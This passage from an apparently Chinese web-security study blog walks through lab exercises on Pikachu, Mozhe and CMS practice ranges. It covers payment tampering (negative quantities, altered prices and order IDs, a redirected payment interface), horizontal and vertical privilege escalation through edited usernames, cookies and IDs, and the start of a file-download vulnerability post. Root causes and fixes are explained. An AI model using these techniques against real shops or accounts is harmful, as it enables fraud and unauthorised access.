src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image20.png" alt="image20"></p><p>抓包分析（num=2为要购买商品的数量）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image21.png" alt="image21"></p><p>将数量改为-1，发现价格变为了0元</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image22.png" alt="image22"></p><p>更改订单编号（以b的价格来买a）</p><p>在购买万能钥匙两件，在提交订单的时候抓取数据包</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image23.png" alt="image23"></p><p>抓取到数据包（获取到了订单编号）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image24.png" alt="image24"></p><p>提交后页面回显</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image25.png" alt="image25"></p><p>然后购买另外一件产品</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image27.png" alt="image27"></p><p>抓包，修改为之前的订单编号，提交后回显，发现价格从60000变成了之前的20000</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image28.png" alt="image28"></p><h3 id="3-修改价格-商品"><a href="#3-修改价格-商品" class="headerlink" title="3.修改价格/商品"></a>3.修改价格/商品</h3><p>靶场地址:大米CMS</p><p>进入靶场</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image29.png" alt="image29"></p><p>购买两个抓取数据包（qty:数量，price:价格）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image30.png" alt="image30"></p><p>修改价格为1元</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/逻辑越权之登录脆弱支付篡改/image31.png" alt="image31"></p><p>发现订单总价改变</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image32.png" alt="image32"></p><p>购买另外一件商品</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image33.png" alt="image33"></p><p>抓取数据包分析</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image34.png" alt="image34"></p><p>其中pic为商品图像，gtype为商品类型（在同一个分类里面，因此相同），与上一个订单不同之处还有id和name。</p><p>因此将这个5400元的商品的id和name改为6000元产品</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image35.png" alt="image35"></p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image36.png" alt="image36"></p><p>然后就发现此时5400买的商品是6000元的商品</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image37.png" alt="image37"></p><h3 id="4-替换支付（修改支付接口）"><a href="#4-替换支付（修改支付接口）" class="headerlink" title="4.替换支付（修改支付接口）"></a>4.替换支付（修改支付接口）</h3><p>靶场niushop，订单提交，抓包分析</p><p>提交的路径传递参数s为支付的接口（这里提交了接口和订单编号）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image38.png" alt="image38"></p><p>index.php?s=/wap/pay/wchatQrcodePay 微信支付</p><p>index.php?s=/wap/pay/alipay 支付宝支付</p><p>总结：$pay_name=$_GET[‘s’]，存在传递参数的才能修改支付接口，如果是固定的话也不行。在这里将参数s变为其它接口就可以修改支付端。</p><p>如链接到一个外部网站：index.php?s=<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/alipay">http://www.xiaodi8.com/alipay</a> 调用其他的支付接口（支付的钱支付到别人的地方）。</p><h3 id="5-支付状态"><a href="#5-支付状态" class="headerlink" title="5.支付状态"></a>5.支付状态</h3><p>与支付接口类似，确认支付成功是返回什么（1），失败返回什么（2），根据返回值伪造已经支付成功。</p><h3 id="6-漏洞产生的原理"><a href="#6-漏洞产生的原理" class="headerlink" title="6.漏洞产生的原理"></a>6.漏洞产生的原理</h3><p>没有去检测数量和价格的唯一性，如6000价格是存储到数据库里，但是这里的价格是直接以post提交的（可以修改），这里应该在接受传参的时候，和数据库的价格比对进行过滤，或者直接用数据库的值 。</p><p>安全的做法：以数据库的数据值为准</p><p>数据包的唯一性判断（token）：第一个数据包购买成功，如果没有检测数据包的唯一性，那么从这个成功的数据包还能再次购买成功。</p><p>漏洞的产生方面：业务逻辑层面。</p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/" class="post-title-link" itemprop="url">逻辑越权之水平垂直越权全解</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-11 09:23:30" itemprop="dateCreated datePublished" datetime="2022-03-11T09:23:30+08:00">2022-03-11</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-30 14:13:55" itemprop="dateModified" datetime="2022-03-30T14:13:55+08:00">2022-03-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>1.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>2 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="逻辑越权之水平垂直越权全解"><a href="#逻辑越权之水平垂直越权全解" class="headerlink" title="逻辑越权之水平垂直越权全解"></a>逻辑越权之水平垂直越权全解</h1><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><h2 id="一-逻辑越权简介"><a href="#一-逻辑越权简介" class="headerlink" title="一.逻辑越权简介"></a>一.逻辑越权简介</h2><h3 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1.水平越权"></a>1.水平越权</h3><p>通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B/C/D账号数据（权限相同）。</p><h4 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h4><p>使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。</p><h3 id="3-未授权访问"><a href="#3-未授权访问" class="headerlink" title="3.未授权访问"></a>3.未授权访问</h3><p>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。(有些操作要管理员才行)</p><h2 id="二-Pikachu——本地水平-垂直越权演示（漏洞成因）"><a href="#二-Pikachu——本地水平-垂直越权演示（漏洞成因）" class="headerlink" title="二.Pikachu——本地水平/垂直越权演示（漏洞成因）"></a>二.Pikachu——本地水平/垂直越权演示（漏洞成因）</h2><h3 id="1-水平越权-1"><a href="#1-水平越权-1" class="headerlink" title="1.水平越权"></a>1.水平越权</h3><p>使用kobe账号登陆查看个人信息</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><p>抓包分析（用户名和cookie）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><p>将用户名改为lucy（其他的用户名通过信息收集获取)，发现个人信息已经更改</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><p>查看源代码：</p><ul><li>判断了是否登录就没有再做检查（猜测这里检查的cookie）</li><li>检测传参submit和username，只有两者不为空就行</li><li>具体显示的信息为username参数传递的用户名</li></ul><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><h3 id="2-垂直越权-1"><a href="#2-垂直越权-1" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h3><p>普通用户登录（只能查看不能添加和删除）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><p>抓取pikachu用户的数据包</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><p>登录管理员用户，记录添加用户的数据包（将这个数据包保存起来）</p><p>添加用户：huangbo，密码:123</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><p>发现创建好了一个用户huangbo，随后删除掉</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image9.png" alt="image9"></p><p>然后登录普通用户pikachu，将pikachu的cookie值复制粘贴到之前创建huangbo的数据包中</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><p>然后发现用户huangbo已经创建好</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3><p>获取数据包的信息方法：</p><ul><li>前端有操作，可以直接抓包</li><li>盲猜添加用户的数据包信息</li><li>获取网站的源码，在本地进行测试</li><li>漏洞有些鸡肋，但是在用户登录的时候可以利用该漏洞直接进入管理员界面</li></ul><h2 id="三-墨者靶场实战"><a href="#三-墨者靶场实战" class="headerlink" title="三.墨者靶场实战"></a>三.墨者靶场实战</h2><p>靶场地址:<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe</a></p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><p>登录test用户（实战中可以自己注册）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><p>抓取test的数据包（获取cookie，观察数据包的格式，特点）</p><p>抓取到两个数据包：</p><p>猜测1——更改uid就可以更改用户</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><p>猜测2——更改card_id（也有可能是uid和card_id都更改才行）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><p>真实网站用户切换的特点（discuz搭建的网站），网站用户的切换是根据uid来进行的（比如我这里</p><p>只是修改后面的uid值就能进行用户界面的跳转）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image16.png" alt="image16"></p><p>直接访问card_id的uri（这里是test的信息）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><p>由于不知道马春生的card_id，因此我们可以选择进行爆破；或者进入主页面那个排行榜，审查元素也能发现马春生的card_id。</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image17.png" alt="image17"></p><p>因此修改对应的card_id，访问得到md5处理后的密码</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image18.png" alt="image18"></p><p>cmd5解码后得到密码明文</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image19.png" alt="image19"></p><p>登录马春生账号，得到key值</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image20.png" alt="image20"></p><h2 id="四-越权漏洞产生的原理解析"><a href="#四-越权漏洞产生的原理解析" class="headerlink" title="四.越权漏洞产生的原理解析"></a>四.越权漏洞产生的原理解析</h2><h3 id="1-前端安全造成：界面"><a href="#1-前端安全造成：界面" class="headerlink" title="1.前端安全造成：界面"></a>1.前端安全造成：界面</h3><p>比如靶场pikachu第二关的登录界面源码，这里只判断了用户是不是管理员，然后进行展示（判断用户等级后，代码界面部分进行可选显示），不安全。</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image21.png" alt="image21"></p><p>这里分为两个级别1和2，而user.php和admin.php界面的区别就是是否可以添加用户</p><p>.php:</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image22.png" alt="image22"></p><p>user.php:</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image23.png" alt="image23"></p><p>但是此处只是前端解密有区别，并没有说非管理员用户不能编辑和添加用户。因为在adminedit.php中只是判断了是否登录，没有再次判断级别问题九江数据插入数据库中（也就是在代码层面判断等级，没有写入数据库）。</p><p>pikachu靶场的垂直越权是通过游客的cookie，去访问就管理员的添加用户的文件（也就是adminedit.php文件），由于adminedit.php只验证是否登录，所以存在越权漏洞。而在登陆跳转是（login.php文件）存在等级验证，所以跳转到了普通用户的前端界面（php前端和脚本卸载一个文件里面），因此普通用户前端无法编辑添加用户。</p><h3 id="2-后端安全造成：数据库"><a href="#2-后端安全造成：数据库" class="headerlink" title="2.后端安全造成：数据库"></a>2.后端安全造成：数据库</h3><p>user 表(管理员和普通用户同表)中，存在如id,username,password,usertype的列名，其中，通过usertype这种列名来判断用户的等级。</p><p>比如在登录管理员用户admin和普通用户pikachu时，代码通常会按照usertype或level等其他标识符来验证用户级别。</p><p>如果在访问数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本（用户组的概念在Linux系统里面也有，涉及普通用户的提权，就是将普通用户加入到root的用户组里面）。</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><h2 id="五-越权检测工具使用"><a href="#五-越权检测工具使用" class="headerlink" title="五.越权检测工具使用"></a>五.越权检测工具使用</h2><h3 id="1-小米范越权漏洞检测工具"><a href="#1-小米范越权漏洞检测工具" class="headerlink" title="1.小米范越权漏洞检测工具"></a>1.小米范越权漏洞检测工具</h3><h3 id="2-Burpsuite插件Authz安装测试"><a href="#2-Burpsuite插件Authz安装测试" class="headerlink" title="2.Burpsuite插件Authz安装测试"></a>2.Burpsuite插件Authz安装测试</h3></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/" class="post-title-link" itemprop="url">文件操作之文件下载读取全解</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-07 16:26:15" itemprop="dateCreated datePublished" datetime="2022-03-07T16:26:15+08:00">2022-03-07</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-08 20:43:12" itemprop="dateModified" datetime="2022-03-08T20:43:12+08:00">2022-03-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>3.2k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>3 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="文件操作之文件下载读取全解"><a href="#文件操作之文件下载读取全解" class="headerlink" title="文件操作之文件下载读取全解"></a>文件操作之文件下载读取全解</h1><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><h2 id="一-靶场——pikachu"><a href="#一-靶场——pikachu" class="headerlink" title="一.靶场——pikachu"></a>一.靶场——pikachu</h2><h3 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><p>直接复制图片地址：<a target="_blank" rel="noopener" href="http://192.168.176.128:10086/pikachu-master/vul/unsafedownload/download/kb.png">http://192.168.176.128:10086/pikachu-master/vul/unsafedownload/download/kb.png</a></p><p>图片在download目录下，根目录:../../../</p><p>点击球员名字是下载，复制下载链接：<a target="_blank" rel="noopener" href="http://192.168.176.128:10086/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png">http://192.168.176.128:10086/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png</a></p><h3 id="2-查看源码"><a href="#2-查看源码" class="headerlink" title="2.查看源码"></a>2.查看源码</h3><p>通过传递参数设置路径并判断该路径下文件是否存在</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><p>然后打开路径下的文件</p><p>filesize()——返回指定文件的大小。如果成功，则返回文件大小的字节数；如果失败，则返回false并生成一条E_WARNING级的错误</p><p>header设置数据包的属性（告诉浏览器要返回的数据）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><h3 id="3-用扫描工具扫描文件目录"><a href="#3-用扫描工具扫描文件目录" class="headerlink" title="3.用扫描工具扫描文件目录"></a>3.用扫描工具扫描文件目录</h3><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><h3 id="4-下载文件"><a href="#4-下载文件" class="headerlink" title="4.下载文件"></a>4.下载文件</h3><p>下载根目录下的index.php文件（猜测有）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><p>网站目录的获取：</p><ul><li>通过扫描工具爬行或者扫码地址</li><li>通过URL报错查看（几率小）</li><li>通过下载传参的脚本文件去发现代码里面出现的文件路径，以及包含文件获取（这里为：execdownload.php）</li><li>数据库配置文件下载或读取后续</li></ul><p><img 